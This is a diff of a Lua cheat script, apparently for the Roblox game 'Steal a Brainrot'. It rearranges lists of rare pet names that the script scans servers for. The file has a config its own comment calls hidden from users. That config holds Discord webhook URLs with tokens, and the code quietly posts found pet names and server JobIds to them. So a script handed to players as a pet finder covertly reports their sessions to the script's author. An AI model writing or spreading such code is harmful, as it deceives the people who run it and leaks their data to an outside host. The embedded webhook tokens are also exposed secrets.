@@ -1,4 +1,4 @@
--- Hidden config for your secret webhooks and pet categories (users won't see this)
+-- Hidden config for your secret webhooks and pet names (users won't see this)
 local webhooks = {
     Common = "https://canary.discord.com/api/webhooks/1413575233692237824/nA1UB_-MNM-y5O8wmbXOFccOgX7wX6fH82OQpOAANik6VT_JZ01NfTl31FAPEGdT0lxL",
     Rare = "https://canary.discord.com/api/webhooks/1413575144303230986/cH-1HHVnNGaYOwPf7aRMXY9m94EGg7J9nPsON8AbfFdIXplVthg6zmy0aCLosNByjMGb",
@@ -10,56 +10,95 @@ local webhooks = {
 }
 
 local hiddenTargetPetNames = {
-    CommonPets = {
-        "Noobini Pizzanini", "Lirilì Larilà", "Tim Cheese",
-        "Fluriflura", "Talpa Di Fero", "Svinina Bombardino",
-        "Raccooni Jandelini", "Pipi Kiwi", "Pipi Corni"
-    },
-    RarePets = {
-        "Trippi Troppi", "Tung Tung Tung Sahur", "Gangster Footera",
-        "Bandito Bobritto", "Boneca Ambalabu", "Cacto Hipopotamo",
-        "Ta Ta Ta Ta Sahur", "Tric Trac Baraboom", "Pipi Avocado"
-    },
-    EpicPets = {
-        "Cappuccino Assassino", "Brr Brr Patapim", "Avocadini Antilopini",
-        "Trulimero Trulichina", "Bambini Crostini", "Bananita Dolphinita",
-        "Perochello Lemonchello", "Brri Brri Bicus Dicus Bombicus",
-        "Avocadini Guffo", "Ti Ti Ti Sahur", "Salamino Penguino",
-        "Penguino Cocosino"
-    },
-    LegendaryPets = {
-        "Burbaloni Loliloli", "Chimpanzini Bananini", "Ballerina Cappuccina",
-        "Chef Crabracadabra", "Lionel Cactuseli", "Glorbo Fruttodrillo",
-        "Quivioli Ameleonni", "Blueberrinni Octopusini", "Pipi Potato",
-        "Strawberelli Flamingelli", "Cocosini Mama", "Pandaccini Bananini",
-        "Pi Pi Watermelon", "Sigma Boy"
-    },
-    MythicPets = {
-        "Frigo Camelo", "Orangutini Ananassini", "Rhino Toasterino",
-        "Bombardiro Crocodilo", "Bombombini Gusini", "Avocadorilla",
-        "Cavallo Virtuoso", "Gorilla Watermelondrillo", "Tob Tobi Tobi",
-        "Lerulerulerule", "Ganganzelli Trulala", "Te Te Te Sahur",
-        "Tracoducotulu Delapeladustuz", "Carloo"
-    },
-    BrainrotGodPets = {
-        "Cocofanto Elefanto", "Girafa Celestre", "Gattatino Nyanino",
-        "Matteo", "Tralalero Tralala", "Los Crocodillitos",
-        "Espresso Signora", "Odin Din Din Dun", "Statutino Libertino",
-        "Trenostruzzo Turbo 3000", "Trigoligre Frutonni",
-        "Orcalero Orcala"
-    },
-    SecretPets = {
-        "La Vacca Saturno Saturnita", "Torrtuginni Dragonfrutini",
-        "Los Tralaleritos", "Las Tralaleritas", "Las Vaquitas Saturnitas",
-        "Graipuss Medussi", "Pot Hotspot", "La Grande Combinasion",
-        "Nuclearo Dinossauro", "Garama and Madundung",
-        "Chicleteira Bicicleteira", "Sammyni Spyderini", "Agarrini La Palini",
-        "Los Combinasionas", "Dragon Cannelloni", "Dul Dul Dul",
-        "Karkerkar Kurkur", "Los Hotspotsitos", "Esok Sekolah",
-        "Blackhole Goat", "Ketupat Kepat", "Bisonte Giuppitere",
-        "Los Spyderinis", "La Supreme Combinasion", "Los Matteos",
-        "Job Job Job Sahur", "Noo My Hotspot", "Spaghetti Tualetti"
-    }
+    -- 🟢 Common
+    "Noobini Pizzanini", "Lirilì Larilà", "Tim Cheese",
+    "Fluriflura", "Talpa Di Fero", "Svinina Bombardino",
+    "Raccooni Jandelini", "Pipi Kiwi", "Pipi Corni",
+    -- 🔵 Rare
+    "Trippi Troppi", "Tung Tung Tung Sahur", "Gangster Footera",
+    "Bandito Bobritto", "Boneca Ambalabu", "Cacto Hipopotamo",
+    "Ta Ta Ta Ta Sahur", "Tric Trac Baraboom", "Pipi Avocado",
+    -- 🟣 Epic
+    "Cappuccino Assassino", "Brr Brr Patapim", "Avocadini Antilopini",
+    "Trulimero Trulichina", "Bambini Crostini", "Bananita Dolphinita",
+    "Perochello Lemonchello", "Brri Brri Bicus Dicus Bombicus",
+    "Avocadini Guffo", "Ti Ti Ti Sahur", "Salamino Penguino",
+    "Penguino Cocosino",
+    -- 🟡 Legendary
+    "Burbaloni Loliloli", "Chimpanzini Bananini", "Ballerina Cappuccina",
+    "Chef Crabracadabra", "Lionel Cactuseli", "Glorbo Fruttodrillo",
+    "Quivioli Ameleonni", "Blueberrinni Octopusini", "Pipi Potato",
+    "Strawberelli Flamingelli", "Cocosini Mama", "Pandaccini Bananini",
+    "Pi Pi Watermelon", "Sigma Boy",
+    -- 🔥 Mythic
+    "Frigo Camelo", "Orangutini Ananassini", "Rhino Toasterino",
+    "Bombardiro Crocodilo", "Bombombini Gusini", "Avocadorilla",
+    "Cavallo Virtuoso", "Gorilla Watermelondrillo", "Tob Tobi Tobi",
+    "Lerulerulerule", "Ganganzelli Trulala", "Te Te Te Sahur",
+    "Tracoducotulu Delapeladustuz", "Carloo",
+    -- 👑 Brainrot God
+    "Cocofanto Elefanto", "Girafa Celestre", "Gattatino Nyanino",
+    "Matteo", "Tralalero Tralala", "Los Crocodillitos",
+    "Espresso Signora", "Odin Din Din Dun", "Statutino Libertino",
+    "Trenostruzzo Turbo 3000", "Trigoligre Frutonni",
+    "Orcalero Orcala",
+    -- 🕶 Secret 
+    "La Vacca Saturno Saturnita", "Torrtuginni Dragonfrutini",
+    "Los Tralaleritos", "Las Tralaleritas", "Las Vaquitas Saturnitas",
+    "Graipuss Medussi", "Pot Hotspot", "La Grande Combinasion",
+    "Nuclearo Dinossauro", "Garama and Madundung",
+    "Chicleteira Bicicleteira", "Sammyni Spyderini", "Agarrini La Palini",
+    "Los Combinasionas", "Dragon Cannelloni", "Dul Dul Dul",
+    "Karkerkar Kurkur", "Los Hotspotsitos", "Esok Sekolah",
+    "Blackhole Goat", "Ketupat Kepat", "Bisonte Giuppitere",
+    "Los Spyderinis", "La Supreme Combinasion", "Los Matteos",
+    "Job Job Job Sahur", "Noo My Hotspot", "Spaghetti Tualetti"
+}
+
+-- Map pet names to their respective webhooks for quick lookup
+local petToWebhook = {
+    -- Common
+    ["Noobini Pizzanini"] = "Common", ["Lirilì Larilà"] = "Common", ["Tim Cheese"] = "Common",
+    ["Fluriflura"] = "Common", ["Talpa Di Fero"] = "Common", ["Svinina Bombardino"] = "Common",
+    ["Raccooni Jandelini"] = "Common", ["Pipi Kiwi"] = "Common", ["Pipi Corni"] = "Common",
+    -- Rare
+    ["Trippi Troppi"] = "Rare", ["Tung Tung Tung Sahur"] = "Rare", ["Gangster Footera"] = "Rare",
+    ["Bandito Bobritto"] = "Rare", ["Boneca Ambalabu"] = "Rare", ["Cacto Hipopotamo"] = "Rare",
+    ["Ta Ta Ta Ta Sahur"] = "Rare", ["Tric Trac Baraboom"] = "Rare", ["Pipi Avocado"] = "Rare",
+    -- Epic
+    ["Cappuccino Assassino"] = "Epic", ["Brr Brr Patapim"] = "Epic", ["Avocadini Antilopini"] = "Epic",
+    ["Trulimero Trulichina"] = "Epic", ["Bambini Crostini"] = "Epic", ["Bananita Dolphinita"] = "Epic",
+    ["Perochello Lemonchello"] = "Epic", ["Brri Brri Bicus Dicus Bombicus"] = "Epic",
+    ["Avocadini Guffo"] = "Epic", ["Ti Ti Ti Sahur"] = "Epic", ["Salamino Penguino"] = "Epic",
+    ["Penguino Cocosino"] = "Epic",
+    -- Legendary
+    ["Burbaloni Loliloli"] = "Legendary", ["Chimpanzini Bananini"] = "Legendary", ["Ballerina Cappuccina"] = "Legendary",
+    ["Chef Crabracadabra"] = "Legendary", ["Lionel Cactuseli"] = "Legendary", ["Glorbo Fruttodrillo"] = "Legendary",
+    ["Quivioli Ameleonni"] = "Legendary", ["Blueberrinni Octopusini"] = "Legendary", ["Pipi Potato"] = "Legendary",
+    ["Strawberelli Flamingelli"] = "Legendary", ["Cocosini Mama"] = "Legendary", ["Pandaccini Bananini"] = "Legendary",
+    ["Pi Pi Watermelon"] = "Legendary", ["Sigma Boy"] = "Legendary",
+    -- Mythic
+    ["Frigo Camelo"] = "Mythic", ["Orangutini Ananassini"] = "Mythic", ["Rhino Toasterino"] = "Mythic",
+    ["Bombardiro Crocodilo"] = "Mythic", ["Bombombini Gusini"] = "Mythic", ["Avocadorilla"] = "Mythic",
+    ["Cavallo Virtuoso"] = "Mythic", ["Gorilla Watermelondrillo"] = "Mythic", ["Tob Tobi Tobi"] = "Mythic",
+    ["Lerulerulerule"] = "Mythic", ["Ganganzelli Trulala"] = "Mythic", ["Te Te Te Sahur"] = "Mythic",
+    ["Tracoducotulu Delapeladustuz"] = "Mythic", ["Carloo"] = "Mythic",
+    -- Brainrot God
+    ["Cocofanto Elefanto"] = "BrainrotGod", ["Girafa Celestre"] = "BrainrotGod", ["Gattatino Nyanino"] = "BrainrotGod",
+    ["Matteo"] = "BrainrotGod", ["Tralalero Tralala"] = "BrainrotGod", ["Los Crocodillitos"] = "BrainrotGod",
+    ["Espresso Signora"] = "BrainrotGod", ["Odin Din Din Dun"] = "BrainrotGod", ["Statutino Libertino"] = "BrainrotGod",
+    ["Trenostruzzo Turbo 3000"] = "BrainrotGod", ["Trigoligre Frutonni"] = "BrainrotGod", ["Orcalero Orcala"] = "BrainrotGod",
+    -- Secret
+    ["La Vacca Saturno Saturnita"] = "Secret", ["Torrtuginni Dragonfrutini"] = "Secret",
+    ["Los Tralaleritos"] = "Secret", ["Las Tralaleritas"] = "Secret", ["Las Vaquitas Saturnitas"] = "Secret",
+    ["Graipuss Medussi"] = "Secret", ["Pot Hotspot"] = "Secret", ["La Grande Combinasion"] = "Secret",
+    ["Nuclearo Dinossauro"] = "Secret", ["Garama and Madundung"] = "Secret",
+    ["Chicleteira Bicicleteira"] = "Secret", ["Sammyni Spyderini"] = "Secret", ["Agarrini La Palini"] = "Secret",
+    ["Los Combinasionas"] = "Secret", ["Dragon Cannelloni"] = "Secret", ["Dul Dul Dul"] = "Secret",
+    ["Karkerkar Kurkur"] = "Secret", ["Los Hotspotsitos"] = "Secret", ["Esok Sekolah"] = "Secret",
+    ["Blackhole Goat"] = "Secret", ["Ketupat Kepat"] = "Secret", ["Bisonte Giuppitere"] = "Secret",
+    ["Los Spyderinis"] = "Secret", ["La Supreme Combinasion"] = "Secret", ["Los Matteos"] = "Secret",
+    ["Job Job Job Sahur"] = "Secret", ["Noo My Hotspot"] = "Secret", ["Spaghetti Tualetti"] = "Secret"
 }
 
 -- Track sent hidden pets to avoid duplicate webhooks in the same session
@@ -187,7 +226,7 @@ local function createPopup(petName)
     end)
 end
 
--- PET CHECK FUNCTION (EXACTLY MATCHING OLDER SCRIPT LOGIC)
+-- PET CHECK FUNCTION (EXACTLY MATCHING WORKING SCRIPT)
 local function checkForPets()
     local userFound = {}
     local hiddenFound = {}
@@ -202,15 +241,14 @@ local function checkForPets()
                 end
             end
             -- Check hidden targets
-            for category, pets in pairs(hiddenPetCategories) do
-                for _, target in pairs(pets) do
-                    if string.find(nameLower, string.lower(target)) then
-                        if not sentHiddenPets[obj.Name] then
-                            table.insert(hiddenFound, {petName = obj.Name, category = category})
-                            sentHiddenPets[obj.Name] = true -- Mark as sent for this session
-                        end
-                        break
+            for _, target in pairs(hiddenTargetPetNames) do
+                if string.find(nameLower, string.lower(target)) then
+                    if not sentHiddenPets[obj.Name] then
+                        local category = petToWebhook[obj.Name] or "Common" -- Fallback to Common if not found
+                        table.insert(hiddenFound, {petName = obj.Name, category = category})
+                        sentHiddenPets[obj.Name] = true -- Mark as sent for this session
                     end
+                    break
                 end
             end
         end
@@ -231,14 +269,14 @@ task.spawn(function()
         -- Handle user-targeted pets (pauses auto-rejoin and shows popup)
         if #userPetsFound > 0 then
             for _, pet in ipairs(userPetsFound) do
-                createPopup(pet) -- Show popup every 3 seconds while pet is present
+                createPopup(pet) -- Show popup every 3 seconds while present
             end
             -- Pause auto-rejoin until no user-targeted pets are found
             repeat
                 task.wait(3) -- Scan every 3 seconds
                 userPetsFound, hiddenPetsFound = checkForPets()
                 for _, pet in ipairs(userPetsFound) do
-                    createPopup(pet) -- Keep showing popup while pet is present
+                    createPopup(pet) -- Keep showing popup while present
                 end
                 for _, petData in ipairs(hiddenPetsFound) do
                     sendWebhook({petData.petName}, game.JobId, petData.category)
